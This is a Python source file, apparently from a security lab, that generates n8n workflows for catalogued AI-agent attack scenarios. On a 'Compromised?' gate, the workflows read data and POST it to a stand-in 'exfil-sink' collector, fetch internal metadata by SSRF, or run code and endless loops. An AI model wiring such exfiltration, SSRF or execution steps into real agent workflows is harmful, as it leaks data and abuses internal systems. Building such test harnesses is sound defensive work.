"""Generate a real n8n workflow per scenario — the 7 archetypes as code.

The refund flagship keeps its bespoke workflow (rich ticket queue). Every other
scenario is emitted here as a genuine n8n graph that EXECUTES real HTTP tool
calls when triggered:

    Webhook → Plan (agent brain) → IF gate → <archetype tools> → Respond

The archetype determines the tool nodes, so each workflow's graph reads as its
own attack (exfil egress, SSRF fetch, run-code, loop, …). Generating them from
the catalog gives "7 templates → 62 workflows" leverage with no hand-drift: the
workflows can't fall out of sync with the scenarios.

CLI:  python -m app.n8n_workflows <dest_dir>   # writes one <webhook>.json each
"""

import json
import sys
import uuid
from pathlib import Path

from app.scenarios import SCENARIOS

SPAWNER = "http://meeseeks-spawner:8007"
SINK = "http://exfil-sink:8009"
_NS = uuid.UUID("00000000-0000-0000-0000-0000feed0001")

_EGRESS = {"exfil", "disclose"}
# archetype -> (true-branch node name, the dangerous marker it stands for)
_EXECUTE_LABEL = {
    "action": "Execute action",
    "rce": "Run code",
    "resource": "Loop forever",
    "demo": "Act unmonitored",
}


def _nid(webhook: str, slug: str) -> str:
    return str(uuid.uuid5(_NS, f"{webhook}:{slug}"))


def _webhook_node(webhook, pos):
    return {
        "parameters": {"httpMethod": "POST", "path": webhook, "responseMode": "responseNode"},
        "id": _nid(webhook, "webhook"), "name": "Webhook",
        "type": "n8n-nodes-base.webhook", "typeVersion": 2, "position": pos, "webhookId": webhook,
    }


def _http(webhook, name, method, url, pos, json_body=None):
    params = {"method": method, "url": url, "options": {}}
    if json_body is not None:
        params.update({"sendBody": True, "specifyBody": "json", "jsonBody": json_body})
    return {
        "parameters": params, "id": _nid(webhook, name), "name": name,
        "type": "n8n-nodes-base.httpRequest", "typeVersion": 4.2, "position": pos,
    }


def _if_gate(webhook, pos):
    return {
        "parameters": {"conditions": {
            "options": {"caseSensitive": True, "typeValidation": "loose"},
            "combinator": "and",
            "conditions": [{
                "id": "c1", "leftValue": "={{ $json.gate }}", "rightValue": "",
                "operator": {"type": "string", "operation": "notEmpty"},
            }],
        }},
        "id": _nid(webhook, "if"), "name": "Compromised?",
        "type": "n8n-nodes-base.if", "typeVersion": 2, "position": pos,
    }


def _respond(webhook, name, body_expr, pos):
    return {
        "parameters": {"respondWith": "json", "responseBody": body_expr},
        "id": _nid(webhook, name), "name": name,
        "type": "n8n-nodes-base.respondToWebhook", "typeVersion": 1, "position": pos,
    }


def _conn(node, *targets):
    return {node: {"main": [[{"node": t, "type": "main", "index": 0} for t in targets]]}}


def _branch(node, true_node, false_node):
    # IF node: output 0 = true, output 1 = false. Two separate output groups.
    return {node: {"main": [
        [{"node": true_node, "type": "main", "index": 0}],
        [{"node": false_node, "type": "main", "index": 0}],
    ]}}


def workflow_for(scenario: dict) -> dict:
    sid, webhook, archetype = scenario["id"], scenario["n8n_webhook"], scenario["archetype"]
    win_body = (
        "={{ { \"result\": \"win\", \"mechanic\": $('Plan').item.json.mechanic, "
        "\"target\": $('Plan').item.json.target } }}"
    )
    clean_body = "={{ { \"result\": \"clean\" } }}"

    nodes = [
        _webhook_node(webhook, [0, 0]),
        _http(webhook, "Plan", "POST", f"{SPAWNER}/scenario/{sid}/plan", [220, 0]),
        _if_gate(webhook, [440, 0]),
        _respond(webhook, "Respond clean", clean_body, [660, 160]),
    ]
    connections = {}
    connections.update(_conn("Webhook", "Plan"))
    connections.update(_conn("Plan", "Compromised?"))

    if archetype in _EGRESS:
        nodes += [
            _http(webhook, "Read data", "GET", f"{SPAWNER}/scenario/{sid}/data", [660, -120]),
            _http(webhook, "Exfiltrate", "POST", f"{SINK}/collect", [880, -120],
                  json_body="={{ { \"source\": \"n8n-" + webhook + "\", \"payload\": $json } }}"),
            _respond(webhook, "Respond win", win_body, [1100, -120]),
        ]
        connections.update(_branch("Compromised?", "Read data", "Respond clean"))
        connections.update(_conn("Read data", "Exfiltrate"))
        connections.update(_conn("Exfiltrate", "Respond win"))
    elif archetype == "recon":
        nodes += [
            _http(webhook, "SSRF fetch", "GET", f"{SPAWNER}/internal/metadata", [660, -120]),
            _respond(webhook, "Respond win", win_body, [880, -120]),
        ]
        connections.update(_branch("Compromised?", "SSRF fetch", "Respond clean"))
        connections.update(_conn("SSRF fetch", "Respond win"))
    else:  # action / rce / resource / demo — a real state-changing tool call
        label = _EXECUTE_LABEL.get(archetype, "Execute action")
        nodes += [
            _http(webhook, label, "POST", f"{SPAWNER}/scenario/{sid}/execute", [660, -120]),
            _respond(webhook, "Respond win", win_body, [880, -120]),
        ]
        connections.update(_branch("Compromised?", label, "Respond clean"))
        connections.update(_conn(label, "Respond win"))

    return {"name": webhook, "nodes": nodes, "connections": connections, "settings": {}}


def write_all(dest: Path) -> list[str]:
    dest.mkdir(parents=True, exist_ok=True)
    written = []
    for s in SCENARIOS:
        if s["id"] == "AGENT-01-REFUND-EXFIL":
            continue  # bespoke flagship workflow ships as a static file
        wf = workflow_for(s)
        path = dest / f"{s['n8n_webhook']}.json"
        path.write_text(json.dumps(wf, indent=2) + "\n")
        written.append(path.name)
    return written


if __name__ == "__main__":
    out = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("workflows")
    names = write_all(out)
    print(f"wrote {len(names)} workflows to {out}")
